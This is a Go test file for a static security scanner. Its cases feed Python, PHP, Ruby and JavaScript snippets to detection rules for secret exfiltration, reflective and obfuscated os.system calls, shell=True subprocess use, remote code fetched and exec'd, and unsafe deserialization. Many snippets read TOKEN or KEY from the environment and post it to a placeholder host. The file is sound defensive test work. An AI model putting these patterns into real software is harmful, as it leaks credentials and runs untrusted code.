package scout_test

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/skarm/scout/internal/scantest"
	scenario "github.com/skarm/scout/internal/scantest/scenarios"
)

func TestUpstreamPythonContainerAndScopeFlows(t *testing.T) {
	c := scenario.ParserConfig(t)
	c.Scanner.Checks.Patterns = true
	s := scenario.Scanner(t, c)
	for _, tc := range []struct {
		name, code string
		want       bool
	}{
		{
			name: "mapping",
			code: "opts={'value':os.getenv('KEY')}\ndef send(*,value):\n requests.post('https://x.invalid',data=value)\nsend(**opts)",
			want: true,
		},
		{
			name: "mapping-public",
			code: "opts={'value':'public'}\ndef send(*,value):\n requests.post('https://x.invalid',data=value)\nsend(**opts)",
			want: false,
		},
		{
			name: "mapping-key-ownership",
			code: "opts={'label':os.getenv('KEY'),'value':'public'}\ndef send(*,label,value):\n requests.post('https://x.invalid',data=value)\nsend(**opts)",
			want: false,
		},
		{
			name: "mapping-alias-overwrite",
			code: "opts={'value':os.getenv('KEY')}\nother=opts\nother['value']='public'\ndef send(*,value):\n requests.post('https://x.invalid',data=value)\nsend(**opts)",
			want: false,
		},
		{
			name: "mapping-branch",
			code: "opts={'value':'public'}\nif unknown:\n opts['value']=os.getenv('KEY')\ndef send(*,value):\n requests.post('https://x.invalid',data=value)\nsend(**opts)",
			want: true,
		},
		{
			name: "forwarding",
			code: "def upload(label,*,payload):\n requests.post('https://x.invalid',data=payload)\ndef wrapper(*args,**kwargs):\n upload(*args,**kwargs)\nwrapper('public',payload=os.getenv('KEY'))",
			want: true,
		},
		{
			name: "forwarding-public",
			code: "def upload(payload,*,label):\n requests.post('https://x.invalid',data=payload)\ndef wrapper(*args,**kwargs):\n upload(*args,**kwargs)\nwrapper('public',label=os.getenv('KEY'))",
			want: false,
		},
		{
			name: "posonly-keyword-to-kwargs",
			code: "def call_api(url,token=None,/,**params):\n return requests.get(url,params=params)\ncall_api('https://x.invalid',token=os.environ['TOKEN'])",
			want: true,
		},
		{
			name: "comprehension-split",
			code: "parts=os.getenv('KEY').split(',')\nrequests.post('https://x.invalid',json=[p for p in parts])",
			want: true,
		},
		{
			name: "comprehension-shadow",
			code: "token=os.getenv('KEY')\nbody=[token for token in token]\nrequests.post('https://x.invalid',json=body)",
			want: true,
		},
		{
			name: "comprehension-isolated",
			code: "token='public'\nbody=[token for token in os.getenv('KEY')]\nrequests.post('https://x.invalid',data=token)",
			want: false,
		},
		{
			name: "comprehension-public-body",
			code: "requests.post('https://x.invalid',data=['public' for token in os.getenv('KEY')])",
			want: false,
		},
		{
			name: "comprehension-false-filter",
			code: "requests.post('https://x.invalid',data=[token for token in os.getenv('KEY') if False])",
			want: false,
		},
		{
			name: "dict-comprehension",
			code: "requests.post('https://x.invalid',json={p:p for p in os.getenv('KEY')})",
			want: true,
		},
		{
			name: "nonlocal",
			code: "def outer():\n token=None\n def load():\n  nonlocal token\n  token=os.getenv('KEY')\n load()\n requests.post('https://x.invalid',data=token)",
			want: true,
		},
		{
			name: "nonlocal-overwrite",
			code: "def outer():\n token=os.getenv('KEY')\n def clear():\n  nonlocal token\n  token='public'\n clear()\n requests.post('https://x.invalid',data=token)",
			want: false,
		},
		{
			name: "nonlocal-not-called",
			code: "def outer():\n token='public'\n def load():\n  nonlocal token\n  token=os.getenv('KEY')\n requests.post('https://x.invalid',data=token)",
			want: false,
		},
		{
			name: "global",
			code: "def configure(value):\n global TOKEN\n TOKEN=value\ndef send():\n requests.post('https://x.invalid',data=TOKEN)\nconfigure(os.getenv('KEY'))\nsend()",
			want: true,
		},
		{
			name: "global-overwrite",
			code: "TOKEN=os.getenv('KEY')\ndef clear():\n global TOKEN\n TOKEN='public'\nclear()\nrequests.post('https://x.invalid',data=TOKEN)",
			want: false,
		},
		{
			name: "global-not-called",
			code: "TOKEN='public'\ndef configure():\n global TOKEN\n TOKEN=os.getenv('KEY')\nrequests.post('https://x.invalid',data=TOKEN)",
			want: false,
		},
		{
			name: "enclosing-global",
			code: "TOKEN=os.getenv('KEY')\ndef outer():\n TOKEN='public'\n def middle():\n  global TOKEN\n  def inner():\n   requests.post('https://x.invalid',data=TOKEN)\n  inner()\n middle()",
			want: true,
		},
		{
			name: "method-order",
			code: "class Holder:\n def keep(self,value):\n  self.value=value\n def get(self):\n  return self.value\n def run(self):\n  self.keep(os.getenv('KEY'))\n  requests.post('https://x.invalid',data=self.get())",
			want: true,
		},
		{
			name: "ordinary-overwrite",
			code: "payload=os.getenv('KEY')\npayload='public'\nrequests.post('https://x.invalid',data=payload)",
			want: false,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r, e := s.ScanBytes(context.Background(), "script.py", []byte("import os, requests\n"+tc.code+"\n"))
			if e != nil && !errors.Is(e, scantest.ErrIncomplete) {
				t.Fatal(e)
			}
			if scenario.HasPortRule(r, "PY-TT3") != tc.want {
				t.Fatalf("TT3 want %v: %+v", tc.want, r.Findings)
			}
		})
	}
}

func TestUpstreamPythonScopeKeepsUnknownBuiltinBindings(t *testing.T) {
	c := scenario.ParserConfig(t)
	s := scenario.Scanner(t, c)
	for _, code := range []string{
		"from unknown_module import *\ndef run():\n exec(payload)\nrun()",
		"from unknown_module import *\nrun=lambda: exec(payload)\nrun()",
	} {
		r, e := s.ScanBytes(context.Background(), "script.py", []byte(code))
		if e != nil && !errors.Is(e, scantest.ErrIncomplete) {
			t.Fatal(e)
		}
		if scenario.HasPortRule(r, "PY-AST1") {
			t.Fatalf("invented builtin binding: %+v", r.Findings)
		}
	}
}

func TestUpstreamAdjudicationPythonFlows(t *testing.T) {
	c := scenario.ParserConfig(t)
	c.Scanner.Checks.YAML = true
	c.Scanner.Checks.Patterns = true
	s := scenario.Scanner(t, c)
	model, err := s.ScanBytes(context.Background(), "SKILL.md", []byte("---\nname: sample\nmodel: external-provider\n---\nGuide"))
	if err != nil && !errors.Is(err, scantest.ErrIncomplete) || !scenario.HasPortRule(model, "NV-EA5") {
		t.Fatalf("frontmatter model: %v %+v", err, model.Findings)
	}
	for _, tc := range []struct {
		name, code string
		want       bool
	}{
		{
			name: "default",
			code: "def send(tok=os.getenv('TOKEN')):\n    requests.post('https://x.invalid', data=tok)",
			want: true,
		},
		{
			name: "lambda-default",
			code: "def send(tok=(lambda: os.getenv('TOKEN'))()):\n    requests.post('https://x.invalid', data=tok)",
			want: true,
		},
		{
			name: "lambda-default-body",
			code: "send=lambda tok=os.getenv('TOKEN'): requests.post('https://x.invalid',data=tok)",
			want: true,
		},
		{
			name: "public-default",
			code: "def send(tok='public'):\n    requests.post('https://x.invalid', data=tok)",
			want: false,
		},
		{
			name: "default-overwrite",
			code: "def send(tok=os.getenv('TOKEN')):\n    tok='public'\n    requests.post('https://x.invalid', data=tok)",
			want: false,
		},
		{
			name: "method-source",
			code: "class C:\n    def token(self):\n        return os.getenv('TOKEN')\n    def send(self):\n        requests.post('https://x.invalid', data=self.token())",
			want: true,
		},
		{
			name: "class-field",
			code: "class C:\n    token = os.getenv('TOKEN')\n    def send(self):\n        requests.post('https://x.invalid', data=self.token)",
			want: true,
		},
		{
			name: "typed-class-field",
			code: "class C:\n    token: str = os.getenv('TOKEN')\n    def send(self):\n        requests.post('https://x.invalid',data=self.token)",
			want: true,
		},
		{
			name: "typed-public-shadow",
			code: "class Base:\n    token=os.getenv('TOKEN')\nclass C(Base):\n    token: str = 'public'\n    def send(self):\n        requests.post('https://x.invalid',data=self.token)",
			want: false,
		},
		{
			name: "annotation-does-not-store",
			code: "class Base:\n    token=os.getenv('TOKEN')\nclass C(Base):\n    token: str\n    def send(self):\n        requests.post('https://x.invalid',data=self.token)",
			want: true,
		},
		{
			name: "method-constructor",
			code: "class C:\n    def __init__(self):\n        self.token=os.getenv('TOKEN')\n    def send(self):\n        requests.post('https://x.invalid', data=self.token)",
			want: true,
		},
		{
			name: "new-constructor",
			code: "class C:\n    def __new__(cls, token):\n        requests.post('https://x.invalid', data=token)\n        return object.__new__(cls)\nC(os.getenv('TOKEN'))",
			want: true,
		},
		{
			name: "unpack-positional",
			code: "def send(label, token):\n    requests.post('https://x.invalid', data=token)\nsend(*['label', os.getenv('TOKEN')])",
			want: true,
		},
		{
			name: "unpack-keyword",
			code: "def send(token):\n    requests.post('https://x.invalid', data=token)\nsend(**{'token':os.getenv('TOKEN')})",
			want: true,
		},
		{
			name: "unpack-public",
			code: "def send(label, token):\n    requests.post('https://x.invalid', data=token)\nsend(*[os.getenv('TOKEN'), 'public'])",
			want: false,
		},
		{
			name: "loop-carried",
			code: "token=None\nfor _ in range(2):\n    requests.post('https://x.invalid', data=token)\n    token=os.getenv('TOKEN')",
			want: true,
		},
		{
			name: "scope-isolation",
			code: "class C:\n    def prepare(self):\n        self.token=os.getenv('TOKEN')\n    def send(self):\n        requests.post('https://x.invalid', data=self.token)",
			want: false,
		},
		{
			name: "overwrite",
			code: "token=os.getenv('TOKEN')\ntoken='public'\nrequests.post('https://x.invalid', data=token)",
			want: false,
		},
		{
			name: "unpack-source",
			code: "token, label = os.getenv('TOKEN'), 'public'\nrequests.post('https://x.invalid', data=token)",
			want: true,
		},
		{
			name: "unpack-overwrite",
			code: "token=os.getenv('TOKEN')\ntoken, token = token, 'public'\nrequests.post('https://x.invalid', data=token)",
			want: false,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r, e := s.ScanBytes(context.Background(), "script.py", []byte("import os, requests\n"+tc.code+"\n"))
			if e != nil && !errors.Is(e, scantest.ErrIncomplete) {
				t.Fatal(e)
			}
			if scenario.HasPortRule(r, "PY-TT3") != tc.want {
				t.Fatalf("TT3 want %v: %+v", tc.want, r.Findings)
			}
		})
	}
	for _, tc := range []struct {
		code, rule string
		want       bool
	}{
		{
			code: "import subprocess\nenabled, ignored=True, 1\nsubprocess.run(command,shell=enabled)",
			rule: "NV-TM1",
			want: true,
		},
		{
			code: "import subprocess\nenabled=True\nenabled, enabled=True, False\nsubprocess.run(command,shell=enabled)",
			rule: "NV-TM1",
			want: false,
		},
		{
			code: "import subprocess\nenabled=True\nFalse and (enabled:=False)\nsubprocess.run(command,shell=enabled)",
			rule: "NV-TM1",
			want: true,
		},
		{
			code: "import subprocess\nenabled=True\nTrue and (enabled:=False)\nsubprocess.run(command,shell=enabled)",
			rule: "NV-TM1",
			want: false,
		},
		{code: "from subprocess import run\nrun(args=completion)", rule: "NV-OH1", want: true},
		{
			code: "import subprocess\nsubprocess.run(['tool', '--output', 'json'],capture_output=True)",
			rule: "NV-OH1",
			want: false,
		},
		{code: "import subprocess\nsubprocess.Popen(input=output)", rule: "NV-OH1", want: false},
		{code: "import subprocess\nsubprocess.run(['tool'],input=output)", rule: "NV-OH1", want: true},
	} {
		r, e := s.ScanBytes(context.Background(), "script.py", []byte(tc.code))
		if e != nil && !errors.Is(e, scantest.ErrIncomplete) || scenario.HasPortRule(r, tc.rule) != tc.want {
			t.Fatalf("%s %q want %v: %v %+v", tc.rule, tc.code, tc.want, e, r.Findings)
		}
	}
}

func TestUpstreamAdjudicationPythonTupleGraphIsBounded(t *testing.T) {
	c := scenario.ParserConfig(t)
	c.Scanner.Checks.Patterns = true
	code := "import os, requests\nx=(os.getenv('TOKEN'),)\n" + strings.Repeat("x=(x,x)\n", 27) + "if unknown:\n    pass\nrequests.post('https://x.invalid',data=x)\n"
	r, e := scenario.Scanner(t, c).ScanBytes(context.Background(), "script.py", []byte(code))
	if e != nil && !errors.Is(e, scantest.ErrIncomplete) || !scenario.HasPortRule(r, "PY-TT3") {
		t.Fatalf("bounded shared tuple graph: %v %+v", e, r.Findings)
	}
}

func TestUpstreamSuiteReflectionAndOpener(t *testing.T) {
	c := scenario.ParserConfig(t)
	c.Scanner.Checks.Patterns = true
	s := scenario.Scanner(t, c)
	for _, tc := range []struct {
		name, text, id string
		want           bool
	}{
		{name: "module-subscript", text: "import os\nos.__dict__['system']('id')", id: "PY-AST9", want: true},
		{name: "builtin-vars", text: "import builtins\nvars(builtins)['exec']('pass')", id: "PY-AST1", want: true},
		{name: "dict-get", text: "import os\nos.__dict__.get('popen')('id')", id: "PY-AST5", want: true},
		{name: "dict-unknown", text: "import os\nos.__dict__[key]('id')", id: "PY-AST7", want: true},
		{name: "literal-join", text: "import os\ngetattr(os,''.join(['sys','tem']))('id')", id: "PY-AST9", want: true},
		{
			name: "stored-reflection",
			text: "import os\nf=getattr(os,''.join(['sys','tem']))\nf('id')",
			id:   "PY-AST5",
			want: true,
		},
		{name: "long-literal", text: "import os\ngetattr(os,'public_attribute')", id: "PY-AST7", want: false},
		{name: "shadow-vars", text: "import os\nvars=lambda x:{}\nvars(os)['system']('id')", id: "PY-AST5", want: false},
		{name: "shadow-module", text: "import os\nos=object()\nos.__dict__['system']('id')", id: "PY-AST9", want: false},
		{
			name: "opener-input",
			text: "import urllib.request as r\nexec(r.build_opener().open('https://example.invalid').read())",
			id:   "PY-TT5",
			want: true,
		},
		{
			name: "opener-secret",
			text: "import os\nfrom urllib.request import build_opener,Request\no=build_opener()\no.open(Request('https://example.invalid',data=os.getenv('TOKEN').encode()))",
			id:   "PY-TT3",
			want: true,
		},
		{
			name: "opener-public",
			text: "from urllib.request import build_opener,Request\nbuild_opener().open(Request('https://example.invalid',data=b'public'))",
			id:   "PY-TT3",
			want: false,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r, e := s.ScanBytes(context.Background(), "handler.py", []byte(tc.text))
			if e != nil && !errors.Is(e, scantest.ErrIncomplete) {
				t.Fatal(e)
			}
			if scenario.HasPortRule(r, tc.id) != tc.want {
				t.Fatalf("%s want %v: %+v", tc.id, tc.want, r.Findings)
			}
		})
	}
}

func TestLanguageGatedDeserialization(t *testing.T) {
	for _, tc := range []struct {
		name, text, id string
		want           bool
	}{
		{name: "handler.php", text: "<?php unserialize($input);", id: "NV-DS1", want: true},
		{name: "handler.php3", text: "<?php unserialize($input);", id: "NV-DS1", want: true},
		{name: "handler.php4", text: "<?php unserialize($input);", id: "NV-DS1", want: true},
		{name: "handler.rb", text: "Marshal.restore(input)", id: "NV-DS2", want: true},
		{name: "build.rake", text: "Marshal.load(input)", id: "NV-DS2", want: true},
		{name: "handler.rb", text: "YAML.load(input)", id: "NV-DS3", want: true},
		{name: "handler.rb", text: "YAML.safe_load(input)", id: "NV-DS3", want: false},
		{name: "handler.js", text: "require('node-serialize').unserialize(input)", id: "NV-DS4", want: true},
		{name: "handler.js", text: "JSON.parse(input)", id: "NV-DS4", want: false},
		{name: "handler.py", text: "obj = Marshal.load(input)", id: "NV-DS2", want: false},
		{name: "SKILL.md", text: "```ruby\nMarshal.load(input)\n```", id: "NV-DS2", want: true},
	} {
		r, scanErr53 := scenario.PortRules(t, tc.name, tc.text)
		if scanErr53 != nil && !errors.Is(scanErr53, scantest.ErrIncomplete) {
			t.Fatal(scanErr53)
		}
		if errors.Is(scanErr53, scantest.ErrIncomplete) && r.Run.State == "complete" {
			t.Fatal("incomplete error with a complete run")
		}

		if scenario.HasPortRule(r, tc.id) != tc.want {
			t.Fatalf("%s %s: %+v", tc.name, tc.id, r.Findings)
		}
	}
}

func TestUpstreamSuitePythonShellTruthiness(t *testing.T) {
	c := scenario.ParserConfig(t)
	c.Scanner.Checks.Patterns = true
	s := scenario.Scanner(t, c)
	for _, tc := range []struct {
		name, code string
		want       bool
	}{
		{name: "boolean", code: "import subprocess\nenabled=True\nsubprocess.run(command,shell=enabled)", want: true},
		{name: "string", code: "import subprocess as s\nenabled='True'\ns.run(command,shell=enabled)", want: true},
		{name: "number", code: "from subprocess import run\nenabled=-1\nrun(command,shell=enabled)", want: true},
		{name: "container", code: "import subprocess\nenabled=(0,)\nsubprocess.run(command,shell=enabled)", want: true},
		{name: "false", code: "import subprocess\nenabled=False\nsubprocess.run(command,shell=enabled)", want: false},
		{name: "zero", code: "import subprocess\nenabled=0\nsubprocess.run(command,shell=enabled)", want: false},
		{
			name: "overwrite",
			code: "import subprocess\nenabled=True\nenabled=False\nsubprocess.run(command,shell=enabled)",
			want: false,
		},
		{
			name: "shadow",
			code: "import subprocess\nsubprocess=object()\nsubprocess.run(command,shell=True)",
			want: false,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r, e := s.ScanBytes(context.Background(), "handler.py", []byte(tc.code))
			if e != nil && !errors.Is(e, scantest.ErrIncomplete) {
				t.Fatal(e)
			}
			if scenario.HasPortRule(r, "NV-TM1") != tc.want {
				t.Fatalf("TM1 want %v: %+v", tc.want, r.Findings)
			}
		})
	}
}
